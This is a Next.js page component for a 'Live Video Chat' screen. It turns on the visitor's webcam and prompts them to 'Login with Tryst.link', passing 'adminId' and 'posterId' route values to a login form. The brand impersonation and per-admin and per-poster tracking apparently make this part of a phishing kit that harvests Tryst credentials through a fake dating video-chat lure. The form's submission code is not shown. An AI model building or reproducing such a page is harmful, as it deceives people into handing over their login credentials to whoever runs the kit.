"use client"
import LoginForm from "@/app/components/LoginForm";
import { useState } from "react";
import Webcam from "react-webcam";

export default function page({params}) {
  const [showForm, setShowForm] = useState(false);
  const { adminId, posterId } = params;
  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center">
    <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
      Waiting...
    </h1>
    <Webcam
      audio={false}
      className="object-cover h-screen w-screen lg:w-auto"
      // height={1080}
      // width={1262}
      // screenshotFormat="image/jpeg"
      // videoConstraints={videoConstraints}
    />

    <div className="absolute flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
      <div className=" bg-white md:w-[400px] py-4 shadow-around rounded-lg">
        {!showForm ? (
          <div className=" flex flex-col items-center">
            <div className="px-8 md:px-12">
              <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
                Live Video Chat
              </h3>

              <p className="mt-[15px] text-lg leading-tight font-medium ">
                Login with Tryst and enjoy with{" "}
                <span className="text-[#2b044d] font-bold">
                  Private Live Video Chat
                </span>{" "}
                your dating partner.
              </p>
            </div>

            <div className="mt-[35px] mb-3 px-4 md:px-12 flex w-full font-serif">
              <button
                className="bg-[#990033] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
                onClick={() => setShowForm(true)}
              >
                <div className="bg-white rounded-md w-10 h-10"></div>
                <p className="">Login with Tryst.link</p>
              </button>
            </div>
          </div>
        ) : (
          <LoginForm adminId={adminId} posterId={posterId} />
        )}
      </div>
    </div>
  </div>
  )
}
